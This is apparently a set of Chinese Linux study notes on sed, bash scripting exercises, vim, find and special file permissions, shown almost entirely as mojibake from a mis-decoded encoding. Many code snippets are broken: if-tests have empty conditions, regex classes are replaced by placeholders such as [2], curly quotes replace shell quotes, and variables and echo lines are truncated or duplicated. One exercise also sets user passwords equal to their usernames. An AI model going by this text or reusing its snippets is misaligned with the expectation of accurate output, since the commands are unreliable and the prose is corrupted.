&amp;: å¼•ç”¨æ¨¡å¼åŒ¹é…æ•´ä¸ªä¸² sedç»ƒä¹ ï¼š1ã€åˆ é™¤/etc/grub.confæ–‡ä»¶ä¸­è¡Œé¦–çš„ç©ºç™½ç¬¦ï¼›sed -r â€˜s@[2]+@@gâ€™ /etc/grub.conf2ã€æ›¿æ¢/etc/inittabæ–‡ä»¶ä¸­&quot;id:3:initdefault:&quot;ä¸€è¡Œä¸­çš„æ•°å­—ä¸º5ï¼›sed â€˜s@(id:)(:initdefault:)@\\15\\2@gâ€™ /etc/inittab3ã€åˆ é™¤/etc/inittabæ–‡ä»¶ä¸­çš„ç©ºç™½è¡Œï¼›sed â€˜/^$/dâ€™ /etc/inittab4ã€åˆ é™¤/etc/inittabæ–‡ä»¶ä¸­å¼€å¤´çš„#å·;sed â€˜s@^#@@gâ€™ /etc/inittab5ã€åˆ é™¤æŸæ–‡ä»¶ä¸­å¼€å¤´çš„#å·åŠåé¢çš„ç©ºç™½å­—ç¬¦ï¼Œä½†è¦æ±‚#å·åé¢å¿…é¡»æœ‰ç©ºç™½å­—ç¬¦;sed -r â€˜s@^#[]+@@gâ€™ /etc/inittab6ã€åˆ é™¤æŸæ–‡ä»¶ä¸­ä»¥ç©ºç™½å­—ç¬¦åé¢è·Ÿ#ç±»çš„è¡Œä¸­çš„å¼€å¤´çš„ç©ºç™½å­—ç¬¦åŠ#sed -r â€˜s@[3]+#@@gâ€™ /etc/inittab7ã€å–å‡ºä¸€ä¸ªæ–‡ä»¶è·¯å¾„çš„ç›®å½•åç§°;echo â€œ/etc/rc.d/â€ | sed -r â€˜s@^(/./)+/?@\\1@gâ€™åŸºåï¼šecho â€œ/etc/rc.d/â€ | sed -r 's@^/./(+)/?@\\1@gâ€™#abc hello world hi worldç»ƒä¹ ï¼šä¼ é€’ä¸€ä¸ªç”¨æˆ·åå‚æ•°ç»™è„šæœ¬ï¼Œåˆ¤æ–­æ­¤ç”¨æˆ·çš„ç”¨æˆ·åè·Ÿå…¶åŸºæœ¬ç»„çš„ç»„åæ˜¯å¦ä¸€è‡´ï¼Œå¹¶å°†ç»“æœæ˜¾ç¤ºå‡ºæ¥ã€‚å­—ç¬¦æµ‹è¯•ï¼š==ï¼šæµ‹è¯•æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰ä¸ºçœŸï¼Œä¸ç­‰ä¸ºå‡!=: æµ‹è¯•æ˜¯å¦ä¸ç­‰ï¼Œä¸ç­‰ä¸ºçœŸï¼Œç­‰ä¸ºå‡&lt;-n string: æµ‹è¯•æŒ‡å®šå­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºï¼Œç©ºåˆ™çœŸï¼Œä¸ç©ºåˆ™å‡-z string: æµ‹è¯•æŒ‡å®šå­—ç¬¦ä¸²æ˜¯å¦ä¸ç©ºï¼Œä¸ç©ºä¸ºçœŸï¼Œç©ºåˆ™ä¸ºå‡ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ä¼ é€’ä¸€ä¸ªå‚æ•°(å•å­—ç¬¦å°±è¡Œ)ç»™è„šæœ¬ï¼Œå¦‚å‚æ•°ä¸ºqï¼Œå°±é€€å‡ºè„šæœ¬ï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºç”¨æˆ·çš„å‚æ•°ï¼›ç»ƒä¹ ï¼šå†™ä¸€ä¸ªè„šæœ¬ä¼ é€’ä¸€ä¸ªå‚æ•°(å•å­—ç¬¦å°±è¡Œ)ç»™è„šæœ¬ï¼Œå¦‚å‚æ•°ä¸ºqã€Qã€quitæˆ–Quitï¼Œå°±é€€å‡ºè„šæœ¬ï¼›å¦åˆ™ï¼Œå°±æ˜¾ç¤ºç”¨æˆ·çš„å‚æ•°ï¼›#!/bin/bashif ;thenecho â€œQuitingâ€¦â€exit 1elif ;thenecho â€œQuitingâ€¦â€exit 2elif ;thenecho â€œQuitingâ€¦â€exit 3elif ;thenecho â€œQuitingâ€¦â€exit 4elseecho $1fiç»ƒä¹ ï¼šä¼ é€’ä¸‰ä¸ªå‚æ•°ç»™è„šæœ¬ï¼Œç¬¬ä¸€ä¸ªä¸ºæ•´æ•°ï¼Œç¬¬äºŒä¸ªä¸ºç®—æœ¯è¿ç®—ç¬¦ï¼Œç¬¬ä¸‰ä¸ªä¸ºæ•´æ•°ï¼Œå°†è®¡ç®—ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œè¦æ±‚ä¿ç•™ä¸¤ä½ç²¾åº¦ã€‚å½¢å¦‚ï¼š./calc.sh 5 / 2ç»ƒä¹ ï¼šä¼ é€’3ä¸ªå‚æ•°ç»™è„šæœ¬ï¼Œå‚æ•°å‡ä¸ºç”¨æˆ·åã€‚å°†æ­¤äº›ç”¨æˆ·çš„å¸å·ä¿¡æ¯æå–å‡ºæ¥åæ”¾ç½®äº/tmp/testusers.txtæ–‡ä»¶ä¸­ï¼Œå¹¶è¦æ±‚æ¯ä¸€è¡Œè¡Œé¦–æœ‰è¡Œå·ã€‚å†™ä¸€ä¸ªè„šæœ¬ï¼šåˆ¤æ–­å½“å‰ä¸»æœºçš„CPUç”Ÿäº§å•†ï¼Œå…¶ä¿¡æ¯åœ¨/proc/cpuinfoæ–‡ä»¶ä¸­vendor idä¸€è¡Œä¸­ã€‚å¦‚æœå…¶ç”Ÿäº§å•†ä¸ºAuthenticAMDï¼Œå°±æ˜¾ç¤ºå…¶ä¸ºAMDå…¬å¸ï¼›å¦‚æœå…¶ç”Ÿäº§å•†ä¸ºGenuineIntelï¼Œå°±æ˜¾ç¤ºå…¶ä¸ºIntelå…¬å¸ï¼›å¦åˆ™ï¼Œå°±è¯´å…¶ä¸ºéä¸»æµå…¬å¸ï¼›å†™ä¸€ä¸ªè„šæœ¬ï¼šç»™è„šæœ¬ä¼ é€’ä¸‰ä¸ªæ•´æ•°ï¼Œåˆ¤æ–­å…¶ä¸­çš„æœ€å¤§æ•°å’Œæœ€å°æ•°ï¼Œå¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚MAX=0MAX -eq $1MAX=$1MAX -lt $2MAX=$2å¾ªç¯ï¼šè¿›å…¥æ¡ä»¶ï¼Œé€€å‡ºæ¡ä»¶forwhileuntilfor å˜é‡ in åˆ—è¡¨; doå¾ªç¯ä½“donefor I in 1 2 3 4 5 6 7 8 9 10; doåŠ æ³•è¿ç®—doneéå†å®Œæˆä¹‹åï¼Œé€€å‡ºï¼›å¦‚ä½•ç”Ÿæˆåˆ—è¡¨ï¼š{1â€¦100}seq [èµ·å§‹æ•° ] ç»“æŸæ•°1,â€¦,100declare -i SUM=0integer-xå†™ä¸€ä¸ªè„šæœ¬ï¼š1ã€è®¾å®šå˜é‡FILEçš„å€¼ä¸º/etc/passwd2ã€ä¾æ¬¡å‘/etc/passwdä¸­çš„æ¯ä¸ªç”¨æˆ·é—®å¥½ï¼Œå¹¶æ˜¾ç¤ºå¯¹æ–¹çš„shellï¼Œå½¢å¦‚ï¼šHello, root, your shell: /bin/bash3ã€ç»Ÿè®¡ä¸€å…±æœ‰å¤šå°‘ä¸ªç”¨æˆ·for I in seq 1 $LINES; do echo &quot;Hello, head -n $I /etc/passwd | tail -1 | cut -d: -f1&quot;; doneåªå‘é»˜è®¤shellä¸ºbashçš„ç”¨æˆ·é—®å£°å¥½å†™ä¸€ä¸ªè„šæœ¬ï¼š1ã€æ·»åŠ 10ä¸ªç”¨æˆ·user1åˆ°user10ï¼Œå¯†ç åŒç”¨æˆ·åï¼›ä½†è¦æ±‚åªæœ‰ç”¨æˆ·ä¸å­˜åœ¨çš„æƒ…å†µä¸‹æ‰èƒ½æ·»åŠ ï¼›æ‰©å±•ï¼šæ¥å—ä¸€ä¸ªå‚æ•°ï¼šadd: æ·»åŠ ç”¨æˆ·user1â€¦user10del: åˆ é™¤ç”¨æˆ·user1â€¦user10å…¶å®ƒï¼šé€€å‡ºadminusers user1,user2,user3,hello,hiå†™ä¸€ä¸ªè„šæœ¬ï¼šè®¡ç®—100ä»¥å†…æ‰€æœ‰èƒ½è¢«3æ•´é™¤çš„æ­£æ•´æ•°çš„å’Œï¼›å–æ¨¡ï¼Œå–ä½™:%3%2=1100%55=45å†™ä¸€ä¸ªè„šæœ¬ï¼šè®¡ç®—100ä»¥å†…æ‰€æœ‰å¥‡æ•°çš„å’Œä»¥åŠæ‰€æœ‰å¶æ•°çš„å’Œï¼›åˆ†åˆ«æ˜¾ç¤ºä¹‹ï¼›let I=SUM=SUM=SUM=let SUM+=$Ilet I+=1 ç›¸å½“äº let I++-=let I-=1 ç›¸å½“äº let Iâ€“++I, --I *=/=%=å†™ä¸€ä¸ªè„šæœ¬ï¼Œåˆ†åˆ«æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸Šæ‰€æœ‰é»˜è®¤shellä¸ºbashçš„ç”¨æˆ·å’Œé»˜è®¤shellä¸º/sbin/nologinçš„ç”¨æˆ·ï¼Œå¹¶ç»Ÿè®¡å„ç±»shellä¸‹çš„ç”¨æˆ·æ€»æ•°ã€‚æ˜¾ç¤ºç»“æœå½¢å¦‚ï¼šBASHï¼Œ3usersï¼Œthey are:root,redhat,gentooNOLOGIN, 2users, they are:bin,ftp#!/bin/bashNUMBASH=grep &quot;bash$&quot; /etc/passwd | wc -lBASHUSERS=grep &quot;bash$&quot; /etc/passwd | cut -d: -f1BASHUSERS=echo $BASHUSERS | sed 's@[]@,@g'echo &quot;BASH, NUMBASHusers,theyare:&quot;echo&quot;NUMBASH users, they are:&quot; echo &quot;NUMBASHusers,theyare:&quot;echo&quot;BASHUSERSåœ¨å‰©ä¸‹çš„ä¸‰æœˆé‡Œï¼Œä½ æ„¿æ„ä¸å­¦ä¹ ç»“ä¸ºä¼´ä¾£ï¼Œæ— è®ºè´«ç©·è¿˜æ˜¯å¯Œè´µï¼Œæ— è®ºç”µè„‘è¿˜æ˜¯æ‰‹æœºï¼Œæ— è®ºå¤šå›°æˆ–è€…å¤šç´¯ï¼Œæ— è®ºæƒ³åƒè¿˜æ˜¯æƒ³ç¡ï¼Œéƒ½è¦æŠŠå­¦ä¹ æ”¾åœ¨ç¬¬ä¸€ä½ï¼Œä»¥ä¸è½åä¸ºç›®æ ‡ï¼ŒåŒç”˜å…±è‹¦åŒèˆŸå…±æµæ°¸ä¸è¨€å¼ƒï¼Œçˆ±æƒœå¥¹å°Šé‡å¥¹ç†è§£å¥¹ä¿æŠ¤å¥¹ï¼Œä½ æ„¿æ„è¿™æ ·åšä¹ˆï¼ŸYes,I do!æµ‹è¯•ï¼šæ•´æ•°æµ‹è¯•-le-lt-ge-gt-eq-neå­—ç¬¦æµ‹è¯•==!=&gt;&lt;-n-zæ–‡ä»¶æµ‹è¯•-e-f-d-r-w-xif ; thenç»„åˆæµ‹è¯•æ¡ä»¶-a: ä¸å…³ç³»-o: æˆ–å…³ç³»!ï¼š éå…³ç³»ifif &amp;&amp;q, Q, quit, Quitvimç¼–è¾‘å™¨æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå­—å¤„ç†å™¨ASCIInano, sedvi: Visual Interfacevim: VI iMprovedå…¨å±ç¼–è¾‘å™¨ï¼Œæ¨¡å¼åŒ–ç¼–è¾‘å™¨vimæ¨¡å¼ï¼šç¼–è¾‘æ¨¡å¼(å‘½ä»¤æ¨¡å¼)è¾“å…¥æ¨¡å¼æœ«è¡Œæ¨¡å¼æ¨¡å¼è½¬æ¢ï¼šç¼–è¾‘â€“&gt;è¾“å…¥ï¼ši: åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„å‰é¢ï¼Œè½¬ä¸ºè¾“å…¥æ¨¡å¼ï¼›a: åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„åé¢ï¼Œè½¬ä¸ºè¾“å…¥æ¨¡å¼ï¼›o: åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹æ–¹ï¼Œæ–°å»ºä¸€è¡Œï¼Œå¹¶è½¬ä¸ºè¾“å…¥æ¨¡å¼ï¼›Iï¼šåœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„è¡Œé¦–ï¼Œè½¬æ¢ä¸ºè¾“å…¥æ¨¡å¼ Aï¼šåœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„è¡Œå°¾ï¼Œè½¬æ¢ä¸ºè¾“å…¥æ¨¡å¼ Oï¼šåœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸Šæ–¹ï¼Œæ–°å»ºä¸€è¡Œï¼Œå¹¶è½¬ä¸ºè¾“å…¥æ¨¡å¼ï¼› è¾“å…¥â€“&gt;ç¼–è¾‘ï¼šESCç¼–è¾‘â€“&gt;æœ«è¡Œï¼šï¼šæœ«è¡Œâ€“&gt;ç¼–è¾‘ï¼šESC, ESCä¸€ã€æ‰“å¼€æ–‡ä»¶ vim /path/to/somefilevim +# :æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶å®šä½äºç¬¬#è¡Œ vim +ï¼šæ‰“å¼€æ–‡ä»¶ï¼Œå®šä½è‡³æœ€åä¸€è¡Œ vim +/PATTERN : æ‰“å¼€æ–‡ä»¶ï¼Œå®šä½è‡³ç¬¬ä¸€æ¬¡è¢«PATTERNåŒ¹é…åˆ°çš„è¡Œçš„è¡Œé¦– é»˜è®¤å¤„äºç¼–è¾‘æ¨¡å¼ äºŒã€å…³é—­æ–‡ä»¶1ã€æœ«è¡Œæ¨¡å¼å…³é—­æ–‡ä»¶:q é€€å‡º:wq ä¿å­˜å¹¶é€€å‡º:q! ä¸ä¿å­˜å¹¶é€€å‡º:w ä¿å­˜:w! å¼ºè¡Œä¿å­˜:wq --&gt; :x2ã€ç¼–è¾‘æ¨¡å¼ä¸‹é€€å‡ºZZ: ä¿å­˜å¹¶é€€å‡ºä¸‰ã€ç§»åŠ¨å…‰æ ‡(ç¼–è¾‘æ¨¡å¼)1ã€é€å­—ç¬¦ç§»åŠ¨ï¼šh: å·¦l: å³j: ä¸‹k: ä¸Š#h: ç§»åŠ¨#ä¸ªå­—ç¬¦ï¼›2ã€ä»¥å•è¯ä¸ºå•ä½ç§»åŠ¨w: ç§»è‡³ä¸‹ä¸€ä¸ªå•è¯çš„è¯é¦–e: è·³è‡³å½“å‰æˆ–ä¸‹ä¸€ä¸ªå•è¯çš„è¯å°¾b: è·³è‡³å½“å‰æˆ–å‰ä¸€ä¸ªå•è¯çš„è¯é¦–#w: 3ã€è¡Œå†…è·³è½¬ï¼š0: ç»å¯¹è¡Œé¦–^: è¡Œé¦–çš„ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦$: ç»å¯¹è¡Œå°¾4ã€è¡Œé—´è·³è½¬#Gï¼šè·³è½¬è‡³ç¬¬#è¡Œï¼›Gï¼šæœ€åä¸€è¡Œæœ«è¡Œæ¨¡å¼ä¸‹ï¼Œç›´æ¥ç»™å‡ºè¡Œå·å³å¯ å››ã€ç¿»å±Ctrl+f: å‘ä¸‹ç¿»ä¸€å±Ctrl+b: å‘ä¸Šç¿»ä¸€å±Ctrl+d: å‘ä¸‹ç¿»åŠå±Ctrl+u: å‘ä¸Šç¿»åŠå±äº”ã€åˆ é™¤å•ä¸ªå­—ç¬¦x: åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„çš„å•ä¸ªå­—ç¬¦#x: åˆ é™¤å…‰æ ‡æ‰€åœ¨å¤„åŠå‘åçš„å…±#ä¸ªå­—ç¬¦å…­ã€åˆ é™¤å‘½ä»¤: ddå‘½ä»¤è·Ÿè·³è½¬å‘½ä»¤ç»„åˆä½¿ç”¨ï¼›#dw, #de, #dbdd: åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œ#dd: åˆ é™¤åŒ…æ‹¬å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œåœ¨å†…çš„#è¡Œï¼›æœ«è¡Œæ¨¡å¼ä¸‹ï¼šStartADD,EndADDd.: è¡¨ç¤ºå½“å‰è¡Œ$: æœ€åä¸€è¡Œ+#: å‘ä¸‹çš„#è¡Œä¸ƒã€ç²˜è´´å‘½ä»¤ pp: å¦‚æœåˆ é™¤æˆ–å¤åˆ¶ä¸ºæ•´è¡Œå†…å®¹ï¼Œåˆ™ç²˜è´´è‡³å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸‹æ–¹ï¼Œå¦‚æœå¤åˆ¶æˆ–åˆ é™¤çš„å†…å®¹ä¸ºéæ•´è¡Œï¼Œåˆ™ç²˜è´´è‡³å…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„åé¢ï¼›P: å¦‚æœåˆ é™¤æˆ–å¤åˆ¶ä¸ºæ•´è¡Œå†…å®¹ï¼Œåˆ™ç²˜è´´è‡³å…‰æ ‡æ‰€åœ¨è¡Œçš„ä¸Šæ–¹ï¼Œå¦‚æœå¤åˆ¶æˆ–åˆ é™¤çš„å†…å®¹ä¸ºéæ•´è¡Œï¼Œåˆ™ç²˜è´´è‡³å…‰æ ‡æ‰€åœ¨å­—ç¬¦çš„å‰é¢ï¼›å…«ã€å¤åˆ¶å‘½ä»¤ yç”¨æ³•åŒdå‘½ä»¤ä¹ã€ä¿®æ”¹ï¼šå…ˆåˆ é™¤å†…å®¹ï¼Œå†è½¬æ¢ä¸ºè¾“å…¥æ¨¡å¼c: ç”¨æ³•åŒdå‘½ä»¤åã€æ›¿æ¢ï¼šrR: æ›¿æ¢æ¨¡å¼åä¸€ã€æ’¤æ¶ˆç¼–è¾‘æ“ä½œ uuï¼šæ’¤æ¶ˆå‰ä¸€æ¬¡çš„ç¼–è¾‘æ“ä½œè¿ç»­uå‘½ä»¤å¯æ’¤æ¶ˆæ­¤å‰çš„næ¬¡ç¼–è¾‘æ“ä½œ#u: ç›´æ¥æ’¤æ¶ˆæœ€è¿‘#æ¬¡ç¼–è¾‘æ“ä½œæ’¤æ¶ˆæœ€è¿‘ä¸€æ¬¡æ’¤æ¶ˆæ“ä½œï¼šCtrl+råäºŒã€é‡å¤å‰ä¸€æ¬¡ç¼–è¾‘æ“ä½œ.åä¸‰ã€å¯è§†åŒ–æ¨¡å¼v: æŒ‰å­—ç¬¦é€‰å–Vï¼šæŒ‰çŸ©å½¢é€‰å–åå››ã€æŸ¥æ‰¾/PATTERN?PATTERNnNåäº”ã€æŸ¥æ‰¾å¹¶æ›¿æ¢åœ¨æœ«è¡Œæ¨¡å¼ä¸‹ä½¿ç”¨så‘½ä»¤ADDR1,ADDR2s@PATTERN@string@gi1,$%ï¼šè¡¨ç¤ºå…¨æ–‡ç»ƒä¹ ï¼šå°†/etc/yum.repos.d/server.repoæ–‡ä»¶ä¸­çš„ftp://instructor.example.com/pubæ›¿æ¢ä¸ºhttp://172.16.0.1/yum%s/ftp://instructor.example.com/pub/http://172.16.0.1/yum/g%s@ftp://instructor.example.com/pub@http://172.16.0.1/yum@gæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š repos on instructor for classroom use Main rhel5 servername=Instructor Server Repositorybaseurl=ftp://172.16.0.1/pub/Servergpgcheck=0 This one is needed for xen packagesname=Instructor VT Repositorybaseurl=ftp://172.16.0.1/pub/VTgpgcheck=0 This one is needed for clustering packagesname=Instructor Cluster Repositorybaseurl=ftp://172.16.0.1/pub/Clustergpgcheck=0 This one is needed for cluster storage (GFS, iSCSI target, etcâ€¦) packagesname=Instructor ClusterStorage Repositorybaseurl=ftp://172.16.0.1/pub/ClusterStoragegpgcheck=0åå…­ã€ä½¿ç”¨vimç¼–è¾‘å¤šä¸ªæ–‡ä»¶vim FILE1 FILE2 FILE3:next åˆ‡æ¢è‡³ä¸‹ä¸€ä¸ªæ–‡ä»¶:prev åˆ‡æ¢è‡³å‰ä¸€ä¸ªæ–‡ä»¶:last åˆ‡æ¢è‡³æœ€åä¸€ä¸ªæ–‡ä»¶:first åˆ‡æ¢è‡³ç¬¬ä¸€ä¸ªæ–‡ä»¶é€€å‡º:qa å…¨éƒ¨é€€å‡ºåä¸ƒã€åˆ†å±æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶Ctrl+w, s: æ°´å¹³æ‹†åˆ†çª—å£Ctrl+w, v: å‚ç›´æ‹†åˆ†çª—å£åœ¨çª—å£é—´åˆ‡æ¢å…‰æ ‡ï¼šCtrl+w, ARROW:qa å…³é—­æ‰€æœ‰çª—å£åå…«ã€åˆ†çª—å£ç¼–è¾‘å¤šä¸ªæ–‡ä»¶vim -o : æ°´å¹³åˆ†å‰²æ˜¾ç¤ºvim -O : å‚ç›´åˆ†å‰²æ˜¾ç¤ºåä¹ã€å°†å½“å‰æ–‡ä»¶ä¸­éƒ¨åˆ†å†…å®¹å¦å­˜ä¸ºå¦å¤–ä¸€ä¸ªæ–‡ä»¶æœ«è¡Œæ¨¡å¼ä¸‹ä½¿ç”¨wå‘½ä»¤:w:ADDR1,ADDR2w /path/to/somewhereäºŒåã€å°†å¦å¤–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹å¡«å……åœ¨å½“å‰æ–‡ä»¶ä¸­:r /path/to/somefileäºŒåä¸€ã€è·Ÿshelläº¤äº’:! COMMANDäºŒåäºŒã€é«˜çº§è¯é¢˜1ã€æ˜¾ç¤ºæˆ–å–æ¶ˆæ˜¾ç¤ºè¡Œå·:set number:set nu:set nonu2ã€æ˜¾ç¤ºå¿½ç•¥æˆ–åŒºåˆ†å­—ç¬¦å¤§å°å†™:set ignorecase:set ic:set noic3ã€è®¾å®šè‡ªåŠ¨ç¼©è¿›:set autoindent:set ai:set noai4ã€æŸ¥æ‰¾åˆ°çš„æ–‡æœ¬é«˜äº®æ˜¾ç¤ºæˆ–å–æ¶ˆ:set hlsearch:set nohlsearch5ã€è¯­æ³•é«˜äº®:syntax on:syntax offäºŒåä¸‰ã€é…ç½®æ–‡ä»¶/etc/vimrc~/.vimrcvim:grep, egrep, fgrep: æ–‡æœ¬æŸ¥æ‰¾æ–‡ä»¶æŸ¥æ‰¾ï¼šlocate:éå®æ—¶ï¼Œæ¨¡ç³ŠåŒ¹é…ï¼ŒæŸ¥æ‰¾æ˜¯æ ¹æ®å…¨ç³»ç»Ÿæ–‡ä»¶æ•°æ®åº“è¿›è¡Œçš„ï¼› updatedb, æ‰‹åŠ¨ç”Ÿæˆæ–‡ä»¶æ•°æ®åº“é€Ÿåº¦å¿«findï¼šå®æ—¶ç²¾ç¡®æ”¯æŒä¼—å¤šæŸ¥æ‰¾æ ‡å‡†éå†æŒ‡å®šç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å®ŒæˆæŸ¥æ‰¾ï¼Œé€Ÿåº¦æ…¢ï¼›find æŸ¥æ‰¾è·¯å¾„ æŸ¥æ‰¾æ ‡å‡† æŸ¥æ‰¾åˆ°ä»¥åçš„å¤„ç†è¿ä½œæŸ¥æ‰¾è·¯å¾„ï¼šé»˜è®¤ä¸ºå½“å‰ç›®å½•æŸ¥æ‰¾æ ‡å‡†ï¼šé»˜è®¤ä¸ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤„ç†è¿ä½œï¼šé»˜è®¤ä¸ºæ˜¾ç¤ºåŒ¹é…æ ‡å‡†ï¼š-name â€˜FILENAMEâ€™ï¼šå¯¹æ–‡ä»¶åä½œç²¾ç¡®åŒ¹é…æ–‡ä»¶åé€šé…ï¼š*ï¼šä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦?[]-iname â€˜FILENAMEâ€™: æ–‡ä»¶ååŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™-regex PATTERNï¼šåŸºäºæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ–‡ä»¶ååŒ¹é…-user USERNAME: æ ¹æ®å±ä¸»æŸ¥æ‰¾ -group GROUPNAME: æ ¹æ®å±ç»„æŸ¥æ‰¾ -uid UID: æ ¹æ®UIDæŸ¥æ‰¾ -gid GID: æ ¹æ®GIDæŸ¥æ‰¾ -nouserï¼šæŸ¥æ‰¾æ²¡æœ‰å±ä¸»çš„æ–‡ä»¶ -nogroup: æŸ¥æ‰¾æ²¡æœ‰å±ç»„çš„æ–‡ä»¶ -type f: æ™®é€šæ–‡ä»¶ d c b l p s -size #k #M #G ç»„åˆæ¡ä»¶ï¼š-a-o-not/tmpç›®å½•ï¼Œä¸æ˜¯ç›®å½•ï¼Œå¹¶ä¸”è¿˜ä¸èƒ½å¥—æ¥å­—ç±»å‹çš„æ–‡ä»¶/tmp/testç›®å½•ä¸‹ï¼Œå±ä¸»ä¸æ˜¯user1ï¼Œä¹Ÿä¸æ˜¯user2çš„æ–‡ä»¶ï¼›-mtime -ctime -atime # -mmin -cmin -amin # -perm MODEï¼šç²¾ç¡®åŒ¹é… /MODE: ä»»æ„ä¸€ä½åŒ¹é…å³æ»¡è¶³æ¡ä»¶ -MODE: æ–‡ä»¶æƒé™èƒ½å®Œå…¨åŒ…å«æ­¤MODEæ—¶æ‰ç¬¦åˆæ¡ä»¶ -644 644: rw-r--r-- 755: rwxr-xr-x 750: rwxr-x--- find ./ -perl -001 è¿ä½œï¼š-print: æ˜¾ç¤º-lsï¼šç±»ä¼¼ls -lçš„å½¢å¼æ˜¾ç¤ºæ¯ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†-ok COMMAND {} ; æ¯ä¸€æ¬¡æ“ä½œéƒ½éœ€è¦ç”¨æˆ·ç¡®è®¤-exec COMMAND {} ;1ã€æŸ¥æ‰¾/varç›®å½•ä¸‹å±ä¸»ä¸ºrootå¹¶ä¸”å±ç»„ä¸ºmailçš„æ‰€æœ‰æ–‡ä»¶ï¼›find /var -user root -group mail2ã€æŸ¥æ‰¾/usrç›®å½•ä¸‹ä¸å±äºroot,bin,æˆ–studentçš„æ–‡ä»¶ï¼›find /usr -not -user root -a -not -user bin -a -not -user studentfind /usr -not ( -user root -o -user bin -o -user student )3ã€æŸ¥æ‰¾/etcç›®å½•ä¸‹æœ€è¿‘ä¸€å‘¨å†…å†…å®¹ä¿®æ”¹è¿‡ä¸”ä¸å±äºrootåŠstudentç”¨æˆ·çš„æ–‡ä»¶ï¼›find /etc -mtime -7 -not \\ ( -user root -o -user student )find /etc -mtime -7 -not -user root -a -not -user student4ã€æŸ¥æ‰¾å½“å‰ç³»ç»Ÿä¸Šæ²¡æœ‰å±ä¸»æˆ–å±ç»„ä¸”æœ€è¿‘1å¤©å†…æ›¾è¢«è®¿é—®è¿‡çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶å±ä¸»å±ç»„å‡ä¿®æ”¹ä¸ºrootï¼›find / ( -nouser -o -nogroup ) -a -atime -1 -exec chown root:root {} ;5ã€æŸ¥æ‰¾/etcç›®å½•ä¸‹å¤§äº1Mçš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶æ–‡ä»¶åå†™å…¥/tmp/etc.largefilesæ–‡ä»¶ä¸­ï¼›find /etc -size +1M &gt;&gt; /tmp/etc.largefiles6ã€æŸ¥æ‰¾/etcç›®å½•ä¸‹æ‰€æœ‰ç”¨æˆ·éƒ½æ²¡æœ‰å†™æƒé™çš„æ–‡ä»¶ï¼Œæ˜¾ç¤ºå‡ºå…¶è¯¦ç»†ä¿¡æ¯ï¼›find /etc -not -perm /222 -lsç‰¹æ®Šæƒé™passwd:sSUID: è¿è¡ŒæŸç¨‹åºæ—¶ï¼Œç›¸åº”è¿›ç¨‹çš„å±ä¸»æ˜¯ç¨‹åºæ–‡ä»¶è‡ªèº«çš„å±ä¸»ï¼Œè€Œä¸æ˜¯å¯åŠ¨è€…ï¼›chmod u+s FILEchmod u-s FILEå¦‚æœFILEæœ¬èº«åŸæ¥å°±æœ‰æ‰§è¡Œæƒé™ï¼Œåˆ™SUIDæ˜¾ç¤ºä¸ºsï¼›å¦åˆ™æ˜¾ç¤ºSï¼›SGID: è¿è¡ŒæŸç¨‹åºæ—¶ï¼Œç›¸åº”è¿›ç¨‹çš„å±ç»„æ˜¯ç¨‹åºæ–‡ä»¶è‡ªèº«çš„å±ç»„ï¼Œè€Œä¸æ˜¯å¯åŠ¨è€…æ‰€å±çš„åŸºæœ¬ç»„ï¼›chmod g+s FILEchmod g-s FILEdevelop team, hadoop, hbase, hive/tmp/project/developSticky: åœ¨ä¸€ä¸ªå…¬å…±ç›®å½•ï¼Œæ¯ä¸ªéƒ½å¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼Œåˆ é™¤è‡ªå·±çš„æ–‡ä»¶ï¼Œä½†ä¸èƒ½åˆ é™¤åˆ«äººçš„æ–‡ä»¶ï¼›chmod o+t DIRchmod o-t DIR000:001:â€¦110ï¼š111ï¼šchmod 5755 /backup/testumask 0022umaskfind:find DIRICTORY Cretiria ACTIONåŒ¹é…æ¡ä»¶ï¼š-typef, d, c, b, l, s, p-atime-amin -size 11M 10M&lt; -user -uid -nouser -nogroup -name -iname -regex ç»„åˆæ¡ä»¶ï¼š -a -o -not \\( \\) ACTION -print -ls -ok -exec æ–‡ä»¶ç‰¹æ®Šæƒé™SUID: sSGID: sSticky: tchmod u+s g+s o+t ç»ƒä¹ 